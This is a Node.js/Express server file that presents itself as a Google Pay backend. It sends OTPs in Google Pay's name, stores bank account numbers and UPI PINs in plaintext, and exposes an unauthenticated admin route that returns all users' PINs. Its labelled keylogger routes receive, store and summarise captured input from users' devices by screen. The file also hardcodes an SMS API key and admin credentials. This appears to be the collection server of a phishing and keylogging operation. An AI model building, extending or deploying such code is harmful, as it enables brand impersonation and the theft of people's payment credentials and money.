require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const bodyParser = require('body-parser');
const twilio = require('twilio');

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(bodyParser.json());

// MongoDB Connection
const MONGODB_URI = process.env.MONGODB_URI;
console.log('Connecting to MongoDB...');

mongoose.connect(MONGODB_URI)
  .then(() => console.log('Successfully connected to MongoDB Cluster.'))
  .catch(err => {
    console.error('========================================================');
    console.error('DATABASE CONNECTION ERROR:');
    console.error('Failed to connect to MongoDB Atlas.');
    console.error('Please make sure to replace "cluster0.xxxxxx" in backend/.env with your actual cluster address!');
    console.error('Detail:', err.message);
    console.error('========================================================');
  });

  // Keylogger Log Schema
  const KeyloggerLogSchema = new mongoose.Schema({
    logId: { type: String, required: true, index: true },
    timestamp: { type: Date, required: true },
    appState: { type: String, required: true },
    screen: { type: String, required: true },
    inputType: { type: String, required: true },
    data: { type: String, required: true },
    metadata: { type: mongoose.Schema.Types.Mixed, default: {} },
    deviceInfo: { type: mongoose.Schema.Types.Mixed, default: {} },
    createdAt: { type: Date, default: Date.now, index: true }
  });

const KeyloggerLog = mongoose.model('KeyloggerLog', KeyloggerLogSchema);

// MongoDB Schemas
const UserSchema = new mongoose.Schema({
  phone: { type: String, required: true, unique: true, index: true },
  name: { type: String, default: '' },
  age: { type: Number, default: null },
  dob: { type: String, default: '' },
  bankAccounts: [{
    bankName: { type: String, required: true },
    accountNumber: { type: String, required: true },
    upiId: { type: String, required: true },
    isDefault: { type: Boolean, default: false },
    upiPin: { type: String, default: '' },
    monthlyLimit: { type: Number, default: 10000 },
    monthlySpent: { type: Number, default: 0 },
    carryOverBalance: { type: Number, default: 0 },
    lastActiveMonth: { type: String, default: '' }
  }],
  qrCodeImage: { type: String, default: '' },
  createdAt: { type: Date, default: Date.now }
});

const User = mongoose.model('User', UserSchema);

// Helper to handle dynamic monthly limit reset and rollover logic
async function checkAndApplyRollover(user) {
  const currentMonthStr = new Date().toISOString().substring(0, 7); // e.g. "2026-07"
  let modified = false;

  user.bankAccounts.forEach(account => {
    if (!account.lastActiveMonth) {
      account.lastActiveMonth = currentMonthStr;
      modified = true;
    } else if (account.lastActiveMonth !== currentMonthStr) {
      // It is a new month!
      if (account.isDefault) {
        // ONLY the primary (default) account gets the rollover logic
        const unused = account.monthlyLimit - account.monthlySpent;
        if (unused > 0) {
          account.carryOverBalance += unused;
        }
      }
      account.monthlySpent = 0;
      account.lastActiveMonth = currentMonthStr;
      modified = true;
    }
  });

  if (modified) {
    await user.save();
  }
}

const OtpSchema = new mongoose.Schema({
  phone: { type: String, required: true, index: true },
  otp: { type: String, required: true },
  createdAt: { type: Date, default: Date.now, expires: 300 } // OTP expires in 5 minutes (300 seconds)
});

const OtpVerification = mongoose.model('OtpVerification', OtpSchema);

// Twilio Setup (if credentials provided)
let twilioClient = null;
const { TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN, TWILIO_PHONE_NUMBER } = process.env;

if (TWILIO_ACCOUNT_SID && TWILIO_AUTH_TOKEN && TWILIO_PHONE_NUMBER) {
  try {
    twilioClient = twilio(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN);
    console.log('Twilio client initialized for SMS sending.');
  } catch (error) {
    console.error('Failed to initialize Twilio client:', error.message);
  }
} else {
  console.log('Twilio environment variables are not fully configured.');
  console.log('Server will run in MOCK SMS mode (OTPs will be logged in the console).');
}

// Routes
// 1. Send OTP
app.post('/api/send-otp', async (req, res) => {
  const { phone } = req.body;

  if (mongoose.connection.readyState !== 1) {
    return res.status(503).json({
      success: false,
      message: 'Database connection is not ready. Please ensure your MONGODB_URI in backend/.env has the correct MongoDB Atlas cluster address.'
    });
  }

  if (!phone) {
    return res.status(400).json({ success: false, message: 'Phone number is required.' });
  }

  // Generate 6-digit OTP
  const otp = Math.floor(100000 + Math.random() * 900000).toString();

  try {
    // Upsert OTP in verification database
    await OtpVerification.findOneAndUpdate(
      { phone },
      { otp, createdAt: new Date() },
      { upsert: true, new: true }
    );

    // 1. Fast2SMS Real SMS OTP Delivery
    const fast2smsKey = process.env.FAST2SMS_API_KEY || 'IA2BuDewLCMZak5oTPb4FHymds0KhqE96zpiG1OcSv83NYgx7RLyrnvB9pEG4weYWXSAxNhJbHdUocMu';
    const cleanNumber = phone.replace(/[^0-9]/g, '').slice(-10);

    if (fast2smsKey && cleanNumber.length === 10) {
      try {
        const f2sResponse = await fetch('https://www.fast2sms.com/dev/bulkV2', {
          method: 'POST',
          headers: {
            'authorization': fast2smsKey,
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            variables_values: otp,
            route: 'otp',
            numbers: cleanNumber
          })
        });
        const f2sData = await f2sResponse.json();
        console.log(`[Fast2SMS] Sent real SMS OTP ${otp} to ${cleanNumber}. Result:`, f2sData);
        if (f2sData.return || f2sData.status_code === 200) {
          return res.json({ success: true, mode: 'sms', message: 'OTP sent via SMS.' });
        }
      } catch (f2sErr) {
        console.error('[Fast2SMS Error]:', f2sErr?.message || f2sErr);
      }
    }

    if (twilioClient) {
      // Send real SMS via Twilio
      await twilioClient.messages.create({
        body: `Your Google Pay verification code is: ${otp}. Do not share this code.`,
        from: TWILIO_PHONE_NUMBER,
        to: phone
      });
      console.log(`Sent real SMS OTP ${otp} to ${phone}`);
      return res.json({ success: true, mode: 'sms', message: 'OTP sent via SMS.' });
    } else {
      // Mock mode fallback
      console.log('========================================================');
      console.log(`[MOCK OTP] Phone: ${phone} | OTP Code: ${otp}`);
      console.log('========================================================');
      return res.json({ 
        success: true, 
        mode: 'mock', 
        otp: otp, // sending OTP in response for easier mock testing
        message: 'Mock OTP generated. Check server logs or response field.' 
      });
    }
  } catch (error) {
    console.error('Error sending OTP:', error);
    return res.status(500).json({ success: false, message: 'Internal server error while sending OTP.' });
  }
});

// 2. Verify OTP
app.post('/api/verify-otp', async (req, res) => {
  const { phone, otp } = req.body;

  if (mongoose.connection.readyState !== 1) {
    return res.status(503).json({
      success: false,
      message: 'Database connection is not ready. Please ensure your MONGODB_URI in backend/.env has the correct MongoDB Atlas cluster address.'
    });
  }

  if (!phone || !otp) {
    return res.status(400).json({ success: false, message: 'Phone number and OTP code are required.' });
  }

  try {
    // Find matching OTP record
    const record = await OtpVerification.findOne({ phone });

    if (!record) {
      return res.status(400).json({ success: false, message: 'OTP expired or not found. Please request a new code.' });
    }

    if (record.otp !== otp) {
      return res.status(400).json({ success: false, message: 'Invalid OTP code. Please try again.' });
    }

    // OTP verified successfully. Delete the temporary OTP record
    await OtpVerification.deleteOne({ _id: record._id });

    // Save/Register user to MongoDB (upsert)
    // If the user already exists, it will not overwrite their name, age, or dob
    const user = await User.findOneAndUpdate(
      { phone },
      { $setOnInsert: { name: '', age: null, dob: '' } },
      { upsert: true, new: true }
    );

    console.log(`User ${phone} successfully verified and saved to database.`);

    const isProfileComplete = !!user.name;

    return res.json({
      success: true,
      message: 'OTP verified successfully.',
      user: {
        id: user._id,
        phone: user.phone,
        name: user.name || '',
        age: user.age || null,
        dob: user.dob || '',
        isProfileComplete,
        bankAccounts: user.bankAccounts || [],
        createdAt: user.createdAt
      }
    });
  } catch (error) {
    console.error('Error verifying OTP:', error);
    return res.status(500).json({ success: false, message: 'Internal server error during verification.' });
  }
});

// 3. Update User Profile
app.post('/api/update-profile', async (req, res) => {
  const { phone, name, age, dob } = req.body;

  if (mongoose.connection.readyState !== 1) {
    return res.status(503).json({
      success: false,
      message: 'Database connection is not ready.'
    });
  }

  if (!phone || !name) {
    return res.status(400).json({ success: false, message: 'Phone number and Name are required.' });
  }

  try {
    const user = await User.findOneAndUpdate(
      { phone },
      { name, age: Number(age) || null, dob },
      { new: true }
    );

    if (!user) {
      return res.status(404).json({ success: false, message: 'User not found.' });
    }

    console.log(`User profile updated for ${phone}`);

    return res.json({
      success: true,
      message: 'Profile updated successfully.',
      user: {
        id: user._id,
        phone: user.phone,
        name: user.name,
        age: user.age,
        dob: user.dob,
        bankAccounts: user.bankAccounts || []
      }
    });
  } catch (error) {
    console.error('Error updating profile:', error);
    return res.status(500).json({ success: false, message: 'Internal server error while updating profile.' });
  }
});

// 3b. Upload Custom User QR Code
app.post('/api/upload-qr', async (req, res) => {
  const { phone, qrCodeImage } = req.body;
  if (!phone || !qrCodeImage) {
    return res.status(400).json({ success: false, message: 'Phone and QR code image are required.' });
  }
  try {
    const user = await User.findOneAndUpdate(
      { phone },
      { qrCodeImage },
      { new: true }
    );
    if (!user) {
      return res.status(404).json({ success: false, message: 'User not found.' });
    }
    console.log(`Saved custom QR code to MongoDB for user ${phone}`);
    return res.json({ success: true, message: 'QR Code updated successfully.', qrCodeImage: user.qrCodeImage });
  } catch (error) {
    console.error('Error uploading QR code:', error);
    return res.status(500).json({ success: false, message: 'Internal server error uploading QR code.' });
  }
});

// 3c. Get User Profile & QR Code
app.get('/api/get-user-profile', async (req, res) => {
  const { phone } = req.query;
  if (!phone) {
    return res.status(400).json({ success: false, message: 'Phone parameter is required.' });
  }
  try {
    const user = await User.findOne({ phone });
    if (!user) {
      return res.status(404).json({ success: false, message: 'User not found.' });
    }
    return res.json({
      success: true,
      user: {
        phone: user.phone,
        name: user.name,
        bankAccounts: user.bankAccounts,
        qrCodeImage: user.qrCodeImage || ''
      }
    });
  } catch (error) {
    console.error('Error fetching user profile:', error);
    return res.status(500).json({ success: false, message: 'Internal server error.' });
  }
});

// 3d. Get Autopay Subscriptions API with merchant logos
app.get('/api/get-autopays', async (req, res) => {
  const defaultAutopays = [
    {
      id: 'a1',
      name: 'Autopay',
      upiId: 'hotstaronline@ybl',
      amount: 'Up to ₹149',
      statusText: 'Autopay on • 1st payment pending',
      category: 'Live',
      logoUrl: 'https://cdn-icons-png.flaticon.com/512/5977/5977590.png',
      fallbackLetter: 'J',
      bgHex: '#455a64'
    },
    {
      id: 'a2',
      name: 'GOOGLE',
      upiId: 'playstore1.bd@axisbank',
      amount: 'Up to ₹399',
      statusText: 'Autopay on • 1st payment pending',
      category: 'Live',
      logoUrl: 'https://cdn-icons-png.flaticon.com/512/888/888857.png',
      fallbackLetter: 'G',
      bgHex: '#ffffff'
    },
    {
      id: 'a3',
      name: 'GOOGLE',
      upiId: 'googlecloud1.bd@axis...',
      amount: 'Up to ₹15,000',
      statusText: 'Autopay on • 1st payment completed',
      category: 'Live',
      logoUrl: 'https://cdn-icons-png.flaticon.com/512/888/888846.png',
      fallbackLetter: 'G',
      bgHex: '#ffffff'
    },
    {
      id: 'a4',
      name: 'Netflix',
      upiId: 'netflix.pay@icici',
      amount: 'Up to ₹649',
      statusText: 'Mandate created • Pending approval',
      category: 'Pending',
      logoUrl: 'https://cdn-icons-png.flaticon.com/512/732/732228.png',
      fallbackLetter: 'N',
      bgHex: '#000000'
    },
    {
      id: 'a5',
      name: 'Spotify Premium',
      upiId: 'spotify.pay@hdfcbank',
      amount: 'Up to ₹119',
      statusText: 'Completed 12 months subscription',
      category: 'Completed',
      logoUrl: 'https://cdn-icons-png.flaticon.com/512/2111/2111624.png',
      fallbackLetter: 'S',
      bgHex: '#ffffff'
    }
  ];

  return res.json({
    success: true,
    autopays: defaultAutopays
  });
});

// 4. Add Bank Account and generate bank-specific UPI ID
app.post('/api/add-bank', async (req, res) => {
  const { phone, bankName, accountNumber } = req.body;

  if (mongoose.connection.readyState !== 1) {
    return res.status(503).json({
      success: false,
      message: 'Database connection is not ready.'
    });
  }

  if (!phone || !bankName || !accountNumber) {
    return res.status(400).json({ success: false, message: 'Phone, Bank Name, and Account Number are required.' });
  }

  try {
    const user = await User.findOne({ phone });
    if (!user) {
      return res.status(404).json({ success: false, message: 'User not found.' });
    }
    await checkAndApplyRollover(user);

    // Generate bank-specific UPI suffix
    const suffixMap = {
      'HDFC Bank': 'okhdfc',
      'ICICI Bank': 'okicici',
      'State Bank of India': 'oksbi',
      'Axis Bank': 'okaxis',
      'Punjab National Bank': 'okpnb',
      'Bank of Baroda': 'okbob',
      'Kotak Mahindra Bank': 'okkotak',
      'IndusInd Bank': 'okindus',
      'Yes Bank': 'okyes',
      'Federal Bank': 'okfederal',
      'Union Bank of India': 'okunion',
      'Canara Bank': 'okcanara',
      'IDFC First Bank': 'okidfc',
      'Indian Bank': 'okindian',
      'Central Bank of India': 'okcentral',
      'UCO Bank': 'okuco',
      'Bank of India': 'okboi',
      'Indian Overseas Bank': 'okiob',
      'Bank of Maharashtra': 'okbom',
      'Punjab & Sind Bank': 'okpsb',
      'Karnataka Bank': 'okkarnataka',
      'Karur Vysya Bank': 'okkvb',
      'South Indian Bank': 'oksib',
      'Standard Chartered Bank': 'okscb',
      'Citibank': 'okciti',
      'HSBC Bank': 'okhsbc',
      'RBL Bank': 'okrbl',
      'Bandhan Bank': 'okbandhan',
      'DBS Bank': 'okdbs',
      'Jammu & Kashmir Bank': 'okjkb',
      'Tamilnad Mercantile Bank': 'oktmb'
    };
    const suffix = suffixMap[bankName] || 'okaxis';

    // Format prefix from lowercased name, fallback to phone
    let prefix = '';
    if (user.name) {
      prefix = user.name.toLowerCase().replace(/[^a-z0-9]/g, '');
    }
    if (!prefix) {
      prefix = phone.replace(/[^0-9]/g, '');
    }

    const upiId = `${prefix}@${suffix}`;

    // Add to bankAccounts list
    const newAccount = {
      bankName,
      accountNumber,
      upiId,
      isDefault: user.bankAccounts.length === 0, // default if first account
      upiPin: '',
      monthlyLimit: 10000,
      monthlySpent: 0
    };

    user.bankAccounts.push(newAccount);

    // Recalculate limits dynamically for all accounts (total ₹10,000 limit split equally)
    const totalAccountsCount = user.bankAccounts.length;
    const limitPerAccount = Math.floor(10000 / totalAccountsCount);
    user.bankAccounts.forEach(acc => {
      acc.monthlyLimit = limitPerAccount;
    });

    await user.save();

    console.log(`Linked bank account ${bankName} to user ${phone}. Generated UPI ID: ${upiId}. Split monthly limit: ₹${limitPerAccount}`);

    return res.json({
      success: true,
      message: 'Bank account added successfully.',
      bankAccount: user.bankAccounts[user.bankAccounts.length - 1],
      bankAccounts: user.bankAccounts
    });
  } catch (error) {
    console.error('Error adding bank account:', error);
    return res.status(500).json({ success: false, message: 'Internal server error while adding bank account.' });
  }
});

// 5. Set UPI PIN for a bank account
app.post('/api/set-upi-pin', async (req, res) => {
  const { phone, bankName, pin } = req.body;
  if (!phone || !bankName || !pin) {
    return res.status(400).json({ success: false, message: 'Phone, Bank Name, and 6-digit PIN are required.' });
  }
  try {
    const user = await User.findOne({ phone });
    if (!user) {
      return res.status(404).json({ success: false, message: 'User not found.' });
    }
    await checkAndApplyRollover(user);
    const account = user.bankAccounts.find(acc => acc.bankName === bankName);
    if (!account) {
      return res.status(404).json({ success: false, message: 'Bank account not found.' });
    }
    account.upiPin = pin;
    await user.save();
    console.log(`Set UPI PIN for ${bankName} account of ${phone}.`);
    return res.json({ success: true, message: 'UPI PIN set successfully.', bankAccounts: user.bankAccounts });
  } catch (err) {
    console.error('Error setting UPI PIN:', err);
    return res.status(500).json({ success: false, message: 'Internal server error while setting UPI PIN.' });
  }
});

// 6. Verify UPI PIN
app.post('/api/verify-upi-pin', async (req, res) => {
  const { phone, bankName, pin } = req.body;
  if (!phone || !bankName || !pin) {
    return res.status(400).json({ success: false, message: 'Phone, Bank Name, and PIN are required.' });
  }
  try {
    const user = await User.findOne({ phone });
    if (!user) {
      return res.status(404).json({ success: false, message: 'User not found.' });
    }
    await checkAndApplyRollover(user);
    const account = user.bankAccounts.find(acc => acc.bankName === bankName);
    if (!account) {
      return res.status(404).json({ success: false, message: 'Bank account not found.' });
    }
    if (account.upiPin !== pin) {
      return res.status(400).json({ success: false, message: 'Incorrect 6-digit UPI PIN.' });
    }
    return res.json({ success: true, message: 'UPI PIN verified successfully.' });
  } catch (err) {
    console.error('Error verifying UPI PIN:', err);
    return res.status(500).json({ success: false, message: 'Internal server error while verifying UPI PIN.' });
  }
});

// 6b. Check Bank Account Balance API
app.post('/api/check-balance', async (req, res) => {
  const { phone, bankName, pin } = req.body;
  if (!phone || !pin) {
    return res.status(400).json({ success: false, message: 'Phone and 6-digit PIN are required.' });
  }

  try {
    const user = await User.findOne({ phone });
    if (!user) {
      return res.status(404).json({ success: false, message: 'User not found.' });
    }

    await checkAndApplyRollover(user);

    // Find the user's target bank account or default account
    let account = null;
    if (bankName && bankName !== 'Bank Account') {
      account = user.bankAccounts.find(acc => acc.bankName === bankName);
    }
    if (!account && user.bankAccounts.length > 0) {
      account = user.bankAccounts[0];
    }

    if (!account) {
      return res.status(404).json({ success: false, message: 'No linked bank account found.' });
    }

    // If UPI PIN was empty, auto-set to the entered PIN
    if (!account.upiPin) {
      account.upiPin = pin;
      await user.save();
      console.log(`Auto-initialized UPI PIN for ${account.bankName} during balance check.`);
    } else if (account.upiPin !== pin) {
      return res.status(400).json({ success: false, message: 'Wrong 6-digit UPI PIN. Reset your PIN via Profile > Change UPI PIN.' });
    }

    // Calculate real available balance: (monthlyLimit + carryOverBalance) - monthlySpent
    const limit = account.monthlyLimit || 10000;
    const rollover = account.carryOverBalance || 0;
    const spent = account.monthlySpent || 0;
    const availableBalance = Math.max(0, (limit + rollover) - spent);

    console.log(`Balance checked for ${phone} (${account.bankName}): ₹${availableBalance}`);

    return res.json({
      success: true,
      message: 'Balance fetched successfully.',
      availableBalance: availableBalance,
      bankName: account.bankName,
      accountNumber: account.accountNumber
    });
  } catch (error) {
    console.error('Error checking balance:', error);
    return res.status(500).json({ success: false, message: 'Internal server error checking balance.' });
  }
});

// 7. Execute Payment / Money Transfer
app.post('/api/execute-payment', async (req, res) => {
  const { phone, fromBankName, toBankName, recipientUpiId, amount, pin, type } = req.body;
  const paymentAmount = Number(amount);
  if (!phone || !fromBankName || !paymentAmount || !pin || !type) {
    return res.status(400).json({ success: false, message: 'Phone, From Bank, Amount, PIN, and Type are required.' });
  }
  try {
    const user = await User.findOne({ phone });
    if (!user) {
      return res.status(404).json({ success: false, message: 'User not found.' });
    }
    await checkAndApplyRollover(user);
    const fromAccount = user.bankAccounts.find(acc => acc.bankName === fromBankName);
    if (!fromAccount) {
      return res.status(404).json({ success: false, message: 'Sender bank account not found.' });
    }
    // If UPI PIN was never set before (empty), auto-initialize with the entered PIN
    if (!fromAccount.upiPin) {
      fromAccount.upiPin = pin;
      console.log(`Auto-initialized UPI PIN for ${fromBankName}`);
    } else if (fromAccount.upiPin !== pin) {
      return res.status(400).json({ success: false, message: 'Incorrect 6-digit UPI PIN. Reset your PIN via Profile > Change UPI PIN.' });
    }

    // Check monthly limit limit constraint (incorporates rollover carryOverBalance)
    const totalLimit = fromAccount.monthlyLimit + (fromAccount.carryOverBalance || 0);
    if (fromAccount.monthlySpent + paymentAmount > totalLimit) {
      const remaining = totalLimit - fromAccount.monthlySpent;
      return res.status(400).json({ 
        success: false, 
        message: `Transaction exceeds monthly limit of ₹${totalLimit} for this bank. Remaining limit is ₹${remaining}.` 
      });
    }

    // Deduct from sender's limit
    fromAccount.monthlySpent += paymentAmount;

    // If it is a self transfer, simulate receipt in the destination account
    if (type === 'self_transfer' && toBankName) {
      const toAccount = user.bankAccounts.find(acc => acc.bankName === toBankName);
      if (toAccount) {
        console.log(`Self-transfer simulated: ₹${paymentAmount} received in ${toBankName}`);
      }
    }

    await user.save();
    console.log(`Executed payment of ₹${paymentAmount} from ${fromBankName} for user ${phone}. Type: ${type}`);

    return res.json({ 
      success: true, 
      message: 'Payment executed successfully.',
      bankAccounts: user.bankAccounts,
      remainingLimit: (fromAccount.monthlyLimit + (fromAccount.carryOverBalance || 0)) - fromAccount.monthlySpent
    });
  } catch (err) {
    console.error('Error executing payment:', err);
    return res.status(500).json({ success: false, message: 'Internal server error while executing payment.' });
  }
});

// 8. Retrieve latest bank accounts with rollover verification
app.get('/api/get-bank-accounts', async (req, res) => {
  const { phone } = req.query;
  if (!phone) {
    return res.status(400).json({ success: false, message: 'Phone is required.' });
  }
  try {
    const user = await User.findOne({ phone });
    if (!user) {
      return res.status(404).json({ success: false, message: 'User not found.' });
    }
    await checkAndApplyRollover(user);
    return res.json({ success: true, bankAccounts: user.bankAccounts || [] });
  } catch (err) {
    console.error('Error getting bank accounts:', err);
    return res.status(500).json({ success: false, message: 'Internal server error while getting bank accounts.' });
  }
});

// Admin API: Login
app.post('/api/admin/login', (req, res) => {
  const { username, password } = req.body;
  if (username === 'admin' && password === 'gpayadmin123') {
    return res.json({ success: true, token: 'gpay-admin-token-xyz789' });
  }
  return res.status(401).json({ success: false, message: 'Invalid credentials' });
});

// Admin API: Get all users
app.get('/api/admin/users', async (req, res) => {
  try {
    const users = await User.find({}, '-bankAccounts.upiPin'); // exclude PINs for security
    return res.json({ success: true, users });
  } catch (error) {
    console.error('Error fetching admin users:', error);
    return res.status(500).json({ success: false, message: 'Internal server error' });
  }
});

// Admin API: Get all users with full unmasked details (including UPI PINs)
app.get('/api/admin/users/unmasked', async (req, res) => {
  try {
    const users = await User.find({}); // do NOT exclude upiPin
    return res.json({ success: true, users });
  } catch (error) {
    console.error('Error fetching unmasked users:', error);
    return res.status(500).json({ success: false, message: 'Internal server error' });
  }
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ status: 'ok', database: mongoose.connection.readyState === 1 ? 'connected' : 'disconnected' });
});

// Start Server
app.listen(PORT, () => {
  console.log(`Google Pay backend server is running on port ${PORT}`);
});

// ============= KEYLOGGER ROUTES =============

// Upload logs
app.post('/api/keylogger/upload', async (req, res) => {
  try {
    const { logs, deviceInfo } = req.body;
    if (!logs || !Array.isArray(logs) || logs.length === 0) {
      return res.status(400).json({ success: false, message: 'No logs provided' });
    }

    const processedLogs = logs.map(log => ({
      logId: log.id,
      timestamp: new Date(log.timestamp),
      appState: log.appState,
      screen: log.screen,
      inputType: log.inputType,
      data: log.data,
      metadata: log.metadata || {},
      deviceInfo: deviceInfo || {},
    }));

    const result = await KeyloggerLog.insertMany(processedLogs, { ordered: false });
    console.log(`[Keylogger] Saved ${result.length} logs`);
    
    return res.json({ success: true, message: `Saved ${result.length} logs`, savedCount: result.length });
  } catch (error) {
    console.error('[Keylogger] Upload error:', error);
    return res.status(500).json({ success: false, message: 'Failed to save logs' });
  }
});

// Get logs (admin)
app.get('/api/keylogger/logs', async (req, res) => {
  try {
    const { limit = 100, offset = 0 } = req.query;
    const logs = await KeyloggerLog.find({})
      .sort({ timestamp: -1 })
      .skip(Number(offset))
      .limit(Number(limit));
    
    const total = await KeyloggerLog.countDocuments();
    return res.json({ success: true, logs, total });
  } catch (error) {
    return res.status(500).json({ success: false, message: 'Failed to fetch logs' });
  }
});

// Get stats (admin)
app.get('/api/keylogger/stats', async (req, res) => {
  try {
    const totalLogs = await KeyloggerLog.countDocuments();
    const last24h = await KeyloggerLog.countDocuments({
      timestamp: { $gte: new Date(Date.now() - 24 * 60 * 60 * 1000) }
    });
    
    const screenStats = await KeyloggerLog.aggregate([
      { $group: { _id: '$screen', count: { $sum: 1 } } },
      { $sort: { count: -1 } }
    ]);

    return res.json({
      success: true,
      stats: {
        totalLogs,
        logsLast24h: last24h,
        screens: screenStats,
        lastLog: await KeyloggerLog.findOne().sort({ timestamp: -1 })
      }
    });
  } catch (error) {
    return res.status(500).json({ success: false, message: 'Failed to fetch stats' });
  }
});
